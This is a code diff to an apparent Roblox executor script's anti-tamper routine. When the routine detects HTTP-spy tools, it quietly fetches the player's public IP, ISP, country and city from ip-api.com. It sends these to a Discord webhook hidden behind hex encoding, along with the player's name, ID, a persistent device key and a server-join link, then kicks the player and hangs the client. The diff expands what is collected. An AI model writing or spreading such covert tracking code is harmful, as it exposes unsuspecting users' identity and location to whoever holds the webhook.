@@ -11,8 +11,12 @@ local _H = game:GetService("HttpService")
 local _tk = "N/A"
 pcall(function()
     if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
-        else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
+        if isfile("nazarkus_key.json") then 
+            _tk = readfile("nazarkus_key.json")
+        else
+            _tk = _H:GenerateGUID(false)
+            writefile("nazarkus_key.json", _tk)
+        end
     end
 end)
 
@@ -23,7 +27,7 @@ local function _SC()
     if debug.getinfo(game.HttpGet).source ~= "=[C]" then return "HOOKED_HTTPGET" end
     local cg = game:GetService("CoreGui")
     for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy"}) do
-        if cg:FindFirstChild(n) or getgenv()[n] then return n end
+        if cg:FindFirstChild(n) or getgenv()[n] then return "SPY_DETECTED_" .. n end
     end
     return false
 end
@@ -32,6 +36,10 @@ local _se = _SC()
 if _se then
     local _A = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
     local ni = {} pcall(function() local r = _req({Url = "http://ip-api.com/json/", Method = "GET"}) if r.Success then ni = _H:JSONDecode(r.Body) end end)
+    local jid = game.JobId == "" and "Unknown" or game.JobId
+    local jLink = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
+    local jBtn = "N/A" pcall(function() local r = _req({Url = jLink, Method = "GET"}) if r.Success then jBtn = r.Body end end)
+
     pcall(function()
         _req({
             Url = _A, Method = "POST",
@@ -41,16 +49,17 @@ if _se then
                     title = "Security Alert: Interceptor Detected",
                     color = 16711680,
                     fields = {
+                        {name = "Detection", value = tostring(_se), inline = false},
                         {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
                         {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
-                        {name = "Network Info", value = string.format("IP: %s\nISP: %s\nLoc: %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A"), inline = false}
+                        {name = "Network Info", value = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false},
+                        {name = "Links", value = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, tostring(_L.UserId)), inline = false}
                     }
                 }}
             })
         })
     end)
-    task.wait(1)
-    _L:Kick("Security Tamper Detected.")
+    _L:Kick("Security Error: " .. tostring(_se))
     while true do end return
 end
 
